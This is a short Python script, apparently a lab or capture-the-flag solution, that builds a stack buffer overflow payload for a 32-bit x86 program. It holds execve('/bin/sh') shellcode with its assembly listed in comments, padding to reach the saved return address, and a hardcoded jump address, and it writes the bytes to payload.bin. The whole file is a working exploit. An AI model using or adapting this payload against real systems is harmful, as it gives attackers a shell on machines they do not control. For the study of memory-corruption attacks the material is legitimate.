import struct

# shellcode to execve(/bin/sh) in x86 machines
# we can check the assembly with https://defuse.ca/online-x86-assembler.htm#disassembly2
# 31 c0             xor    eax, eax
# 50                push   eax
# 68 2f 2f 73 68    push   0x68732f2f
# 68 2f 62 69 6e    push   0x6e69622f
# 89 e3             mov    ebx, esp
# 89 c1             mov    ecx, eax
# 89 c2             mov    edx, eax
# b0 0b             mov    al, 0xb
# cd 80             int    0x80
# 31 c0             xor    eax, eax
# 40                inc    eax
# cd 80             int    0x80

shellcode = b'\x31\xc0\x50\x68\x2f\x2f\x73'
shellcode += b'\x68\x68\x2f\x62\x69\x6e\x89'
shellcode += b'\xe3\x89\xc1\x89\xc2\xb0\x0b'
shellcode += b'\xcd\x80\x31\xc0\x40\xcd\x80'

# offset of the part of the string that will overwrite the return address
padding_len = 48  # anything from 48 to 52 will be the return address

# combine the parts into the actual payload
payload = shellcode +  (b"A" * (padding_len - len(shellcode))) + struct.pack("I", 0x080dacc0) + b"\n"

# write the payload into a binary file
with open("payload.bin", "wb") as f:
    f.write(payload)        
